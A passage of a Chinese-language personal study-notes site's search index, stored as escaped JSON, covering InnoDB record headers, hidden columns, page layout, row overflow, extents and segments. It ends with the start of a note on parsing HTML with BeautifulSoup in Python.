\u503c\u5217\u8868\u5fc5\u987b\u7528\u6574\u6570\u4e2a\u5b57\u8282\u7684\u4f4d\u8868\u793a\uff081\u5b57\u82828\u4f4d\uff09\uff0c\u5982\u679c\u4f7f\u7528\u7684\u4e8c\u8fdb\u5236\u4f4d\u4e2a\u6570\u4e0d\u8db3\u6574\u6570\u4e2a\u5b57\u8282\uff0c\u5219\u5728\u5b57\u8282\u7684\u9ad8\u4f4d\u8865 <code>0</code>\u3002</p> </li> <li> <p>\u8bb0\u5f55\u5934\u4fe1\u606f(\u56fa\u5b9a\u5927\u5c0f5byte)  </p> </li> </ul> <p></p> \u540d\u79f0 \u5927\u5c0f\uff08\u5355\u4f4d\uff1abit\uff09 \u63cf\u8ff0 <code>\u9884\u7559\u4f4d1</code> 1 \u6ca1\u6709\u4f7f\u7528 <code>\u9884\u7559\u4f4d2</code> 1 \u6ca1\u6709\u4f7f\u7528 <code>delete_mask</code> 1 \u6807\u8bb0\u8be5\u8bb0\u5f55\u662f\u5426\u88ab\u5220\u9664 \u3010\u503c\u4e3a0\uff1a\u4ee3\u8868\u8bb0\u5f55\u5e76\u6ca1\u6709\u88ab\u5220\u9664 \u503c\u4e3a1\uff1a\u4ee3\u8868\u8bb0\u5f55\u88ab\u5220\u9664\u6389\u4e86\u3011 <code>mini_rec_mask</code> 1 B+\u6811\u7684\u6bcf\u5c42\u975e\u53f6\u5b50\u8282\u70b9\u4e2d\u7684\u6700\u5c0f\u8bb0\u5f55\u90fd\u4f1a\u6dfb\u52a0\u8be5\u6807\u8bb0 <code>n_owned</code> 4 \u8868\u793a\u5f53\u524d\u8bb0\u5f55\u62e5\u6709\u7684\u8bb0\u5f55\u6570 <code>heap_no</code> 13 \u8868\u793a\u5f53\u524d\u8bb0\u5f55\u5728\u8bb0\u5f55\u5806\u7684\u4f4d\u7f6e\u4fe1\u606f <code>record_type</code> 3 \u8868\u793a\u5f53\u524d\u8bb0\u5f55\u7684\u7c7b\u578b<code>0</code>\u8868\u793a\u666e\u901a\u8bb0\u5f55\uff0c<code>1</code>\u8868\u793aB+\u6811\u975e\u53f6\u5b50\u8282\u70b9\u8bb0\u5f55\uff0c<code>2</code>\u8868\u793a\u6700\u5c0f\u8bb0\u5f55\uff0c<code>3</code>\u8868\u793a\u6700\u5927\u8bb0\u5f55 <code>next_record</code> 16 \u8868\u793a\u4e0b\u4e00\u6761\u8bb0\u5f55\u7684\u76f8\u5bf9\u4f4d\u7f6e <p>\u88ab\u5220\u9664\u7684\u8bb0\u5f55\u4e3a\u4ec0\u4e48\u8fd8\u5728\u9875\u4e2d\u5b58\u50a8\u5462\uff1f \u4f60\u4ee5\u4e3a\u5b83\u5220\u9664\u4e86\uff0c\u53ef\u5b83\u8fd8\u5728\u771f\u5b9e\u7684\u78c1\u76d8\u4e0a\u3002\u8fd9\u4e9b\u88ab\u5220\u9664\u7684\u8bb0\u5f55\u4e4b\u6240\u4ee5\u4e0d\u7acb\u5373\u4ece\u78c1\u76d8\u4e0a\u79fb\u9664\uff0c\u662f\u56e0\u4e3a\u79fb\u9664\u5b83\u4eec\u4e4b\u540e\u5176\u4ed6\u7684\u8bb0\u5f55\u5728\u78c1\u76d8\u4e0a\u9700\u8981<code>\u91cd\u65b0\u6392\u5217\uff0c\u5bfc\u81f4\u6027\u80fd\u6d88\u8017</code>\u3002\u6240\u4ee5\u53ea\u662f\u6253\u4e00\u4e2a\u5220\u9664\u6807\u8bb0\u800c\u5df2\uff0c\u6240\u6709\u88ab\u5220\u9664\u6389\u7684\u8bb0\u5f55\u90fd\u4f1a\u7ec4\u6210\u4e00\u4e2a\u6240\u8c13\u7684<code>\u5783\u573e\u94fe\u8868</code>\uff0c\u5728\u8fd9\u4e2a\u94fe\u8868\u4e2d\u7684\u8bb0\u5f55\u5360\u7528\u7684\u7a7a\u95f4\u79f0\u4e4b\u4e3a<code>\u53ef\u91cd\u7528\u7a7a\u95f4</code>\uff0c\u4e4b\u540e\u5982\u679c\u6709\u65b0\u8bb0\u5f55\u63d2\u5165\u5230\u8868\u4e2d\u7684\u8bdd\uff0c\u53ef\u80fd\u628a\u8fd9\u4e9b\u88ab\u5220\u9664\u7684\u8bb0\u5f55\u5360\u7528\u7684\u5b58\u50a8\u7a7a\u95f4\u8986\u76d6\u6389\u3002</p> <ul> <li>\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e</li> </ul> <p></p> <ol> <li> <p>row_id(6byte)</p> <p>\u5982\u679c\u6211\u4eec\u5efa\u8868\u7684\u65f6\u5019\u6307\u5b9a\u4e86\u4e3b\u952e\u6216\u8005\u552f\u4e00\u7ea6\u675f\u5217\uff0c\u90a3\u4e48\u5c31\u6ca1\u6709 row_id \u9690\u85cf\u5b57\u6bb5\u4e86\u3002\u5982\u679c\u65e2\u6ca1\u6709\u6307\u5b9a\u4e3b\u952e\uff0c\u53c8\u6ca1\u6709\u552f\u4e00\u7ea6\u675f\uff0c\u90a3\u4e48 InnoDB \u5c31\u4f1a\u4e3a\u8bb0\u5f55\u6dfb\u52a0 row_id \u9690\u85cf\u5b57\u6bb5\u3002row_id\u4e0d\u662f\u5fc5\u9700\u7684\u3002</p> </li> <li> <p>trx_id(6byte,MUST)</p> <p>\u4e8b\u52a1id\uff0c\u8868\u793a\u8fd9\u4e2a\u6570\u636e\u662f\u7531\u54ea\u4e2a\u4e8b\u52a1\u751f\u6210\u7684\u3002</p> </li> <li> <p>roll_pointer(7byte,MUST)</p> <p>\u8fd9\u6761\u8bb0\u5f55\u4e0a\u4e00\u4e2a\u7248\u672c\u7684\u6307\u9488\u3002</p> </li> </ol> <p>MySQL \u89c4\u5b9a\u9664\u4e86 TEXT\u3001BLOBs \u8fd9\u79cd\u5927\u5bf9\u8c61\u7c7b\u578b\u4e4b\u5916\uff0c\u5176\u4ed6\u6240\u6709\u7684\u5217\uff08\u4e0d\u5305\u62ec\u9690\u85cf\u5217\u548c\u8bb0\u5f55\u5934\u4fe1\u606f\uff09\u5360\u7528\u7684\u5b57\u8282\u957f\u5ea6\u52a0\u8d77\u6765\u4e0d\u80fd\u8d85\u8fc7 65535 \u4e2a\u5b57\u8282\uff0864KB\uff09\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u884c\u8bb0\u5f55\u9664\u4e86 TEXT\u3001BLOBs \u7c7b\u578b\u7684\u5217\uff0c\u9650\u5236\u6700\u5927\u4e3a 65535 \u5b57\u8282\uff0c\u6ce8\u610f\u662f\u4e00\u884c\u7684\u603b\u957f\u5ea6\uff0c\u4e0d\u662f\u4e00\u5217\u3002</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_13","title":"\u9875","text":"<p>\u6570\u636e\u5e93\u8bfb\u53d6\u7684\u6700\u5c0f\u5355\u4f4d\uff0c\u4e5f\u5c31\u662f\u4e00\u6b21\u78c1\u76d8I/O\u8bfb\u53d6\u4e00\u9875\u6570\u636e\u3002\u9875\u662f\u6709\u5927\u5c0f\u89c4\u5b9a\u7684\uff0c\u9ed8\u8ba4\u6bcf\u4e2a\u9875\u7684\u5927\u5c0f\u4e3a16KB\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u65e0\u8bba\u5176\u4e2d\u6709\u6ca1\u670916KB\u7684\u884c\u8bb0\u5f55\uff0c\u4e00\u9875\u90fd\u4f1a\u670916KB\u3002\u56e0\u6b64\u78c1\u76d8I/O\u4e00\u6b21\u5c31\u4f1a\u8bfb\u53d616KB\u7684\u6570\u636e\uff0c\u5f53\u7136\uff0c\u774016KB\u91cc\u9762\u5e76\u4e0d\u5168\u662f\u6709\u6548\u6570\u636e\uff0c\u4e5f\u5b58\u5728\u7a7a\u767d\u533a\u3002</p> <p>\u9875\u7684\u7c7b\u578b\u6709\u5f88\u591a\uff0c\u5e38\u89c1\u7684\u6709\u6570\u636e\u9875\u3001undo \u65e5\u5fd7\u9875\u3001\u6ea2\u51fa\u9875\u7b49\u7b49\u3002\u6570\u636e\u8868\u4e2d\u7684\u884c\u8bb0\u5f55\u662f\u7528\u300c\u6570\u636e\u9875\u300d\u6765\u7ba1\u7406\u7684</p> <p>\u9875\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> \u540d\u79f0 \u5927\u5c0f \u8bf4\u660e \u6587\u4ef6\u5934File Header 38\u5b57\u8282 \u8868\u793a\u9875\u7684\u4fe1\u606f \u9875\u5934Page Header 56\u5b57\u8282 \u8868\u793a\u9875\u7684\u72b6\u6001\u4fe1\u606f \u6700\u5c0f\u548c\u6700\u5927\u8bb0\u5f55Infimum+superemum 26\u5b57\u8282 \u4e24\u4e2a\u865a\u62df\u7684\u4f2a\u8bb0\u5f55\uff0c\u5206\u8868\u767d\u54e6\u662f\u9875\u4e2d\u7684\u6700\u5c0f\u8bb0\u5f55\u548c\u6700\u5927\u8bb0\u5f55 \u7528\u6237\u8bb0\u5f55Use Records \u4e0d\u786e\u5b9a \u5b58\u50a8\u884c\u8bb0\u5f55\u5185\u5bb9 \u7a7a\u95f2\u7a7a\u95f4Free Space \u4e0d\u786e\u5b9a \u9875\u4e2d\u8fd8\u6ca1\u6709\u88ab\u4f7f\u7528\u7684\u7a7a\u95f4 \u9875\u76ee\u5f55Page Directory \u4e0d\u786e\u5b9a \u5b58\u50a8\u7528\u6237\u8bb0\u5f55\u7684\u76f8\u5bf9\u4f4d\u7f6e\uff0c\u5bf9\u8bb0\u5f55\u8d77\u5230\u7d22\u5f15\u4f5c\u7528 \u6587\u4ef6\u5c3eFile Tailer 8\u5b57\u8282 \u6821\u9a8c\u9875\u662f\u5426\u5b8c\u6574 <ol> <li> <p>\u6587\u4ef6\u5934\u90e8\u548c\u6587\u4ef6\u5c3e\u90e8</p> </li> <li> <p>\u6587\u4ef6\u5934\u90e8\uff0838Byte\uff09</p> \u540d\u79f0 \u5360\u7528\u7a7a\u95f4\u5927\u5c0f \u63cf\u8ff0 <code>FIL_PAGE_SPACE_OR_CHKSUM</code> <code>4</code>\u5b57\u8282 \u9875\u7684\u6821\u9a8c\u548c\uff08checksum\u503c\uff09 <code>FIL_PAGE_OFFSET</code> <code>4</code>\u5b57\u8282 \u9875\u53f7\uff0c\u6bcf\u4e00\u4e2a\u9875\u90fd\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u9875\u53f7\uff0c\u5c31\u8ddf\u4f60\u7684\u8eab\u4efd\u8bc1\u53f7\u7801\u4e00\u6837\uff0cInnoDB\u901a\u8fc7\u9875\u53f7\u53ef\u4ee5\u552f\u4e00\u5b9a\u4f4d\u4e00\u4e2a\u9875\u3002 <code>FIL_PAGE_PREV</code> <code>4</code>\u5b57\u8282 \u4e0a\u4e00\u4e2a\u9875\u7684\u9875\u53f7 <code>FIL_PAGE_NEXT</code> <code>4</code>\u5b57\u8282 \u4e0b\u4e00\u4e2a\u9875\u7684\u9875\u53f7 FIL_PAGE_LSN <code>8</code>\u5b57\u8282 \u9875\u9762\u88ab\u6700\u540e\u4fee\u6539\u65f6\u5bf9\u5e94\u7684\u65e5\u5fd7\u5e8f\u5217\u4f4d\u7f6e <code>FIL_PAGE_TYPE</code> <code>2</code>\u5b57\u8282 \u8be5\u9875\u7684\u7c7b\u578b FIL_PAGE_FILE_FLUSH_LSN <code>8</code>\u5b57\u8282 \u4ec5\u5728\u7cfb\u7edf\u8868\u7a7a\u95f4\u7684\u4e00\u4e2a\u9875\u4e2d\u5b9a\u4e49\uff0c\u4ee3\u8868\u6587\u4ef6\u81f3\u5c11\u88ab\u5237\u65b0\u5230\u4e86\u5bf9\u5e94\u7684LSN\u503c <code>FIL_PAGE_ARCH_LOG_NO_OR_SPACE_ID</code> <code>4</code>\u5b57\u8282 \u9875\u5c5e\u4e8e\u54ea\u4e2a\u8868\u7a7a\u95f4 </li> <li> <p>\u6587\u4ef6\u5c3e\u90e8\uff088Byte\uff09</p> <ul> <li>\u524d4\u4e2a\u5b57\u8282\u4ee3\u8868\u9875\u7684\u6821\u9a8c\u548c\uff1a\u8fd9\u4e2a\u90e8\u5206\u662f\u548cFile Header\u4e2d\u7684\u6821\u9a8c\u548c\u76f8\u5bf9\u5e94\u7684\u3002</li> <li>\u540e4\u4e2a\u5b57\u8282\u4ee3\u8868\u9875\u9762\u88ab\u6700\u540e\u4fee\u6539\u65f6\u5bf9\u5e94\u7684\u65e5\u5fd7\u5e8f\u5217\u4f4d\u7f6e\uff08LSN\uff09\uff1a\u8fd9\u4e2a\u90e8\u5206\u4e5f\u662f\u4e3a\u4e86\u6821\u9a8c\u9875\u7684\u5b8c\u6574\u6027\u7684\uff0c\u5982\u679c\u9996\u90e8\u548c\u5c3e\u90e8\u7684LSN\u503c\u6821\u9a8c\u4e0d\u6210\u529f\u7684\u8bdd\uff0c\u5c31\u8bf4\u660e\u540c\u6b65\u8fc7\u7a0b\u51fa\u73b0\u4e86\u95ee\u9898</li> </ul> </li> </ol> <p>\u5728 File Header \u4e2d\u6709\u4e24\u4e2a\u6307\u9488\uff0c\u5206\u522b\u6307\u5411\u4e0a\u4e00\u4e2a\u6570\u636e\u9875\u548c\u4e0b\u4e00\u4e2a\u6570\u636e\u9875\uff0c\u8fde\u63a5\u8d77\u6765\u7684\u9875\u76f8\u5f53\u4e8e\u4e00\u4e2a\u53cc\u5411\u7684\u94fe\u8868\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a\u91c7\u7528\u94fe\u8868\u7684\u7ed3\u6784\u662f\u8ba9\u6570\u636e\u9875\u4e4b\u95f4\u4e0d\u9700\u8981\u662f\u7269\u7406\u4e0a\u7684\u8fde\u7eed\u7684\uff0c\u800c\u662f\u903b\u8f91\u4e0a\u7684\u8fde\u7eed\u3002</p> <p></p> <p>InnoDB \u91cc\u7684 B+ \u6811\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u90fd\u662f\u4e00\u4e2a\u6570\u636e\u9875\uff0c\u4f46\u662f\u53ea\u6709\u53f6\u5b50\u7ed3\u70b9\u624d\u5b58\u653e\u771f\u6b63\u7684\u6570\u636e\uff0c\u7ed3\u6784\u793a\u610f\u56fe\u5982\u4e0b\uff1a</p> <p></p> <p>\u8fd9\u6837\u7684\u8bbe\u8ba1\u53ef\u4ee5\u5927\u5927\u51cf\u5c11\u78c1\u76d8I/O\u7684\u6b21\u6570\uff0c\u6781\u5927\u5730\u53d1\u6325\u7cfb\u7edf\u6027\u80fd\u3002</p> <p>\u884c\u6ea2\u51fa\u540e\uff0cMySQL \u662f\u600e\u4e48\u5904\u7406\u7684\uff1f</p> <p>MySQL \u4e2d\u78c1\u76d8\u548c\u5185\u5b58\u4ea4\u4e92\u7684\u57fa\u672c\u5355\u4f4d\u662f\u9875\uff0c\u4e00\u4e2a\u9875\u7684\u5927\u5c0f\u4e00\u822c\u662f <code>16KB</code>\uff0c\u4e5f\u5c31\u662f <code>16384\u5b57\u8282</code>\uff0c\u800c\u4e00\u4e2a varchar(n) \u7c7b\u578b\u7684\u5217\u6700\u591a\u53ef\u4ee5\u5b58\u50a8 <code>65532\u5b57\u8282</code>\uff0c\u4e00\u4e9b\u5927\u5bf9\u8c61\u5982 TEXT\u3001BLOB \u53ef\u80fd\u5b58\u50a8\u66f4\u591a\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u4e00\u4e2a\u9875\u53ef\u80fd\u5c31\u5b58\u4e0d\u4e86\u4e00\u6761\u8bb0\u5f55\u3002\u8fd9\u4e2a\u65f6\u5019\u5c31\u4f1a\u53d1\u751f\u884c\u6ea2\u51fa\uff0c\u591a\u7684\u6570\u636e\u5c31\u4f1a\u5b58\u5230\u53e6\u5916\u7684\u300c\u6ea2\u51fa\u9875\u300d\u4e2d\u3002</p> <p>\u5982\u679c\u4e00\u4e2a\u6570\u636e\u9875\u5b58\u4e0d\u4e86\u4e00\u6761\u8bb0\u5f55\uff0cInnoDB \u5b58\u50a8\u5f15\u64ce\u4f1a\u81ea\u52a8\u5c06\u6ea2\u51fa\u7684\u6570\u636e\u5b58\u653e\u5230\u300c\u6ea2\u51fa\u9875\u300d\u4e2d\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cInnoDB \u7684\u6570\u636e\u90fd\u662f\u5b58\u653e\u5728 \u300c\u6570\u636e\u9875\u300d\u4e2d\u3002\u4f46\u662f\u5f53\u53d1\u751f\u884c\u6ea2\u51fa\u65f6\uff0c\u6ea2\u51fa\u7684\u6570\u636e\u4f1a\u5b58\u653e\u5230\u300c\u6ea2\u51fa\u9875\u300d\u4e2d\u3002</p> <p>\u5f53\u53d1\u751f\u884c\u6ea2\u51fa\u65f6\uff0c\u5728\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u5904\u53ea\u4f1a\u4fdd\u5b58\u8be5\u5217\u7684\u4e00\u90e8\u5206\u6570\u636e\uff0c\u800c\u628a\u5269\u4f59\u7684\u6570\u636e\u653e\u5728\u300c\u6ea2\u51fa\u9875\u300d\u4e2d\uff0c\u7136\u540e\u771f\u5b9e\u6570\u636e\u5904\u7528 20 \u5b57\u8282\u5b58\u50a8\u6307\u5411\u6ea2\u51fa\u9875\u7684\u5730\u5740\uff0c\u4ece\u800c\u53ef\u4ee5\u627e\u5230\u5269\u4f59\u6570\u636e\u6240\u5728\u7684\u9875\u3002\u5927\u81f4\u5982\u4e0b\u56fe\u6240\u793a\u3002</p> <p></p> <p>\u4e0a\u9762\u8fd9\u4e2a\u662f Compact \u884c\u683c\u5f0f\u5728\u53d1\u751f\u884c\u6ea2\u51fa\u540e\u7684\u5904\u7406\u3002</p> <p>Compressed \u548c Dynamic \u8fd9\u4e24\u4e2a\u884c\u683c\u5f0f\u548c Compact \u975e\u5e38\u7c7b\u4f3c\uff0c\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5904\u7406\u884c\u6ea2\u51fa\u6570\u636e\u65f6\u6709\u4e9b\u533a\u522b\u3002</p> <p>\u8fd9\u4e24\u79cd\u683c\u5f0f\u91c7\u7528\u5b8c\u5168\u7684\u884c\u6ea2\u51fa\u65b9\u5f0f\uff0c\u8bb0\u5f55\u7684\u771f\u5b9e\u6570\u636e\u5904\u4e0d\u4f1a\u5b58\u50a8\u8be5\u5217\u7684\u4e00\u90e8\u5206\u6570\u636e\uff0c\u53ea\u5b58\u50a8 20 \u4e2a\u5b57\u8282\u7684\u6307\u9488\u6765\u6307\u5411\u6ea2\u51fa\u9875\u3002\u800c\u5b9e\u9645\u7684\u6570\u636e\u90fd\u5b58\u50a8\u5728\u6ea2\u51fa\u9875\u4e2d\uff0c\u770b\u8d77\u6765\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p></p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_14","title":"\u533a","text":"<p>\u6211\u4eec\u77e5\u9053 InnoDB \u5b58\u50a8\u5f15\u64ce\u662f\u7528 B+ \u6811\u6765\u7ec4\u7ec7\u6570\u636e\u7684\u3002</p> <p>B+ \u6811\u4e2d\u6bcf\u4e00\u5c42\u90fd\u662f\u901a\u8fc7\u53cc\u5411\u94fe\u8868\u8fde\u63a5\u8d77\u6765\u7684\uff0c\u5982\u679c\u662f\u4ee5\u9875\u4e3a\u5355\u4f4d\u6765\u5206\u914d\u5b58\u50a8\u7a7a\u95f4\uff0c\u90a3\u4e48\u94fe\u8868\u4e2d\u76f8\u90bb\u7684\u4e24\u4e2a\u9875\u4e4b\u95f4\u7684\u7269\u7406\u4f4d\u7f6e\u5e76\u4e0d\u662f\u8fde\u7eed\u7684\uff0c\u53ef\u80fd\u79bb\u5f97\u975e\u5e38\u8fdc\uff0c\u90a3\u4e48\u78c1\u76d8\u67e5\u8be2\u65f6\u5c31\u4f1a\u6709\u5927\u91cf\u7684\u968f\u673aI/O\uff0c\u968f\u673a I/O \u662f\u975e\u5e38\u6162\u7684\u3002</p> <p>\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u4e5f\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u8ba9\u94fe\u8868\u4e2d\u76f8\u90bb\u7684\u9875\u7684\u7269\u7406\u4f4d\u7f6e\u4e5f\u76f8\u90bb\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528\u987a\u5e8f I/O \u4e86\uff0c\u90a3\u4e48\u5728\u8303\u56f4\u67e5\u8be2\uff08\u626b\u63cf\u53f6\u5b50\u8282\u70b9\uff09\u7684\u65f6\u5019\u6027\u80fd\u5c31\u4f1a\u5f88\u9ad8\u3002\u90a3\u5177\u4f53\u600e\u4e48\u89e3\u51b3\u5462\uff1f</p> <p>\u5728\u8868\u4e2d\u6570\u636e\u91cf\u5927\u7684\u65f6\u5019\uff0c\u4e3a\u67d0\u4e2a\u7d22\u5f15\u5206\u914d\u7a7a\u95f4\u7684\u65f6\u5019\u5c31\u4e0d\u518d\u6309\u7167\u9875\u4e3a\u5355\u4f4d\u5206\u914d\u4e86\uff0c\u800c\u662f\u6309\u7167\u533a\uff08extent\uff09\u4e3a\u5355\u4f4d\u5206\u914d\u3002\u6bcf\u4e2a\u533a\u7684\u5927\u5c0f\u4e3a 1MB\uff0c\u5bf9\u4e8e 16KB \u7684\u9875\u6765\u8bf4\uff0c\u8fde\u7eed\u7684 64 \u4e2a\u9875\u4f1a\u88ab\u5212\u4e3a\u4e00\u4e2a\u533a\uff0c\u8fd9\u6837\u5c31\u4f7f\u5f97\u94fe\u8868\u4e2d\u76f8\u90bb\u7684\u9875\u7684\u7269\u7406\u4f4d\u7f6e\u4e5f\u76f8\u90bb\uff0c\u5c31\u80fd\u4f7f\u7528\u987a\u5e8f I/O \u4e86</p>"},{"location":"Note/MySql%E5%AD%A6%E4%B9%A0/#_15","title":"\u6bb5","text":"<p>\u8868\u7a7a\u95f4\u662f\u7531\u5404\u4e2a\u6bb5\uff08segment\uff09\u7ec4\u6210\u7684\uff0c\u6bb5\u662f\u7531\u591a\u4e2a\u533a\uff08extent\uff09\u7ec4\u6210\u7684\u3002\u6bb5\u4e00\u822c\u5206\u4e3a\u6570\u636e\u6bb5\u3001\u7d22\u5f15\u6bb5\u548c\u56de\u6eda\u6bb5\u7b49\u3002</p> <p>\u5bf9\u4e8e\u8303\u56f4\u67e5\u8be2\uff0c\u5176\u5b9e\u662f\u5bf9B+\u6811\u53f6\u5b50\u8282\u70b9\u4e2d\u7684\u8bb0\u5f55\u8fdb\u884c\u987a\u5e8f\u626b\u63cf\uff0c\u800c\u5982\u679c\u4e0d\u533a\u5206\u53f6\u5b50\u8282\u70b9\u548c\u975e\u53f6\u5b50\u8282\u70b9\uff0c\u7edf\u7edf\u628a\u8282\u70b9\u4ee3\u8868\u7684\u9875\u9762\u653e\u5230\u7533\u8bf7\u5230\u7684\u533a\u4e2d\u7684\u8bdd\uff0c\u8fdb\u884c\u8303\u56f4\u626b\u63cf\u7684\u6548\u679c\u5c31\u5927\u6253\u6298\u6263\u4e86\u3002\u6240\u4ee5InnoDB\u5bf9B+\u6811\u7684\u53f6\u5b50\u8282\u70b9\u548c\u975e\u53f6\u5b50\u8282\u70b9\u8fdb\u884c\u4e86\u533a\u522b\u5bf9\u5f85\uff0c\u4e5f\u5c31\u662f\u8bf4\u53f6\u5b50\u8282\u70b9\u6709\u81ea\u5df1\u72ec\u6709\u7684\u533a\uff0c\u975e\u53f6\u5b50\u8282\u70b9\u4e5f\u6709\u81ea\u5df1\u72ec\u6709\u7684\u533a\u3002\u5b58\u653e\u53f6\u5b50\u8282\u70b9\u7684\u533a\u7684\u96c6\u5408\u5c31\u7b97\u662f\u4e00\u4e2a\u6bb5\uff08segment\uff09\uff0c\u5b58\u653e\u975e\u53f6\u5b50\u8282\u70b9\u7684\u533a\u7684\u96c6\u5408\u4e5f\u7b97\u662f\u4e00\u4e2a\u6bb5\u3002\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2a\u7d22\u5f15\u4f1a\u751f\u62102\u4e2a\u6bb5\uff0c\u4e00\u4e2a\u53f6\u5b50\u8282\u70b9\u6bb5\uff0c\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u6bb5\u3002</p> <p>\u9664\u4e86\u7d22\u5f15\u7684\u53f6\u5b50\u8282\u70b9\u6bb5\u548c\u975e\u53f6\u5b50\u8282\u70b9\u6bb5\u4e4b\u5916\uff0cInnoDB\u4e2d\u8fd8\u6709\u4e3a\u5b58\u50a8\u4e00\u4e9b\u7279\u6b8a\u7684\u6570\u636e\u800c\u5b9a\u4e49\u7684\u6bb5\uff0c\u6bd4\u5982\u56de\u6eda\u6bb5\u3002\u6240\u4ee5\uff0c\u5e38\u89c1\u7684\u6bb5\u6709\u6570\u636e\u6bb5\u3001\u7d22\u5f15\u6bb5\u3001\u56de\u6eda\u6bb5\u3002\u6570\u636e\u6bb5\u5373\u4e3aB+\u6811\u7684\u53f6\u5b50\u8282\u70b9\uff0c\u7d22\u5f15\u6bb5\u5373\u4e3aB+\u6811\u7684\u975e\u53f6\u5b50\u8282\u70b9\u3002</p> <p>\u5728InnoDB\u5b58\u50a8\u5f15\u64ce\u4e2d\uff0c\u5bf9\u6bb5\u7684\u7ba1\u7406\u90fd\u662f\u7531\u5f15\u64ce\u81ea\u8eab\u6240\u5b8c\u6210\uff0cDBA\u4e0d\u80fd\u4e5f\u6ca1\u6709\u5fc5\u8981\u5bf9\u5176\u8fdb\u884c\u63a7\u5236\u3002\u8fd9\u4ece\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u7b80\u5316\u4e86DBA\u5bf9\u4e8e\u6bb5\u7684\u7ba1\u7406\u3002</p> <p>\u6bb5\u5176\u5b9e\u4e0d\u5bf9\u5e94\u8868\u7a7a\u95f4\u4e2d\u7684\u67d0\u4e00\u4e2a\u8fde\u7eed\u7684\u7269\u7406\u533a\u57df\uff0c\u800c\u662f\u4e00\u4e2a\u903b\u8f91\u4e0a\u7684\u6982\u5ff5\uff0c\u7531\u82e5\u5e72\u4e2a\u96f6\u6563\u7684\u9875\u9762\u4ee5\u53ca\u4e00\u4e9b\u5b8c\u6574\u7684\u533a\u7ec4\u6210\u3002</p> <ul> <li>\u7d22\u5f15\u6bb5\uff1a\u5b58\u653e B + \u6811\u7684\u975e\u53f6\u5b50\u8282\u70b9\u7684\u533a\u7684\u96c6\u5408\uff1b</li> <li>\u6570\u636e\u6bb5\uff1a\u5b58\u653e B + \u6811\u7684\u53f6\u5b50\u8282\u70b9\u7684\u533a\u7684\u96c6\u5408\uff1b</li> <li>\u56de\u6eda\u6bb5\uff1a\u5b58\u653e\u7684\u662f\u56de\u6eda\u6570\u636e\u7684\u533a\u7684\u96c6\u5408\uff0c\u4e4b\u524d\u8bb2\u4e8b\u52a1\u9694\u79bb\u7684\u65f6\u5019\u5c31\u4ecb\u7ecd\u5230\u4e86 MVCC \u5229\u7528\u4e86\u56de\u6eda\u6bb5\u5b9e\u73b0\u4e86\u591a\u7248\u672c\u67e5\u8be2\u6570\u636e\u3002</li> </ul>"},{"location":"Record%26Review/","title":"\u5b66\u4e60\u7b14\u8bb0","text":"<p>\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u4e3b\u8981\u5b58\u653e\u6211\u7cfb\u7edf\u5b66\u4e60\u7684\u7b14\u8bb0\u76ee\u524d\u6709</p> <ol> <li>BS4\u89e3\u6790HTML</li> <li>Docker\u548cDockerCompose\u7684\u4f7f\u7528</li> <li>JAVA\u591a\u7ebf\u7a0b</li> <li>Python\u4e2d\u7684\u96c6\u5408\u8fd0\u7b97\u7b26</li> <li>Spring Cloud</li> <li>\u5927\u6570\u636e\u4e0b\u7684\u6570\u636e\u5b58\u50a8\u95ee\u9898</li> <li>\u6b63\u5219\u8868\u8fbe\u5f0f</li> </ol> <p>\u6784\u5efa\u4e00\u4e2a\u67e5\u6f0f\u8865\u7f3a\u5e93\uff0c\u5bf9\u4e8e\u5e73\u5e38\u9047\u5230\u56f0\u96be\u7684\u6216\u8005\u5b66\u5230\u7684\u96f6\u788e\u7684\u77e5\u8bc6\u505a\u4e00\u4e2a\u8bb0\u5f55</p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/","title":"BS4\u89e3\u6790HTML","text":"<p>BS4\u662f\u4e00\u4e2a\u5916\u90e8\u7684\u5de5\u5177\uff0c\u9700\u8981\u901a\u8fc7pip\u5f15\u5165\u4f7f\u7528\uff0c\u5177\u4f53\u64cd\u4f5c\u53ef\u767e\u5ea6</p>"},{"location":"Record%26Review/BS4%E8%A7%A3%E6%9E%90HTML/#bs4","title":"BS4\u4f7f\u7528\u524d\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c","text":"<pre><code>from bs4 import BeautifulSoup\ndef get_bs(url,timeout):#\u8bf7\u6c42\u4e00\u4e2a\u7f51\u9875\uff0c\u4ee5HTML\u7684\u683c\u5f0f\u8fd4\u56de\uff0c\u5982\u679c\u8d85\u65f6\u6216\u8005\u7f51\u9875\u6211\u65e0\u6cd5\u8bbf\u95ee\uff0c\u5219\u8fd4\u56de\u4e00\u4e2aNone\n    header={\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35\"}\n    request = urllib.request.Request(url=url,headers=header)\n    try:\n        response = urllib.request.urlopen(request,timeout=timeout)\n        html = response.read().decode(\"utf-8\")\n    except Exception:\n        return None\n    bs= BeautifulSoup(html,\"html.parser\")#bs\u5c31\u662f\u5df2\u7ecf\u521d\u59cb\u5316\u597d\u7684\u5bf9\u8c61\n</code></pre> 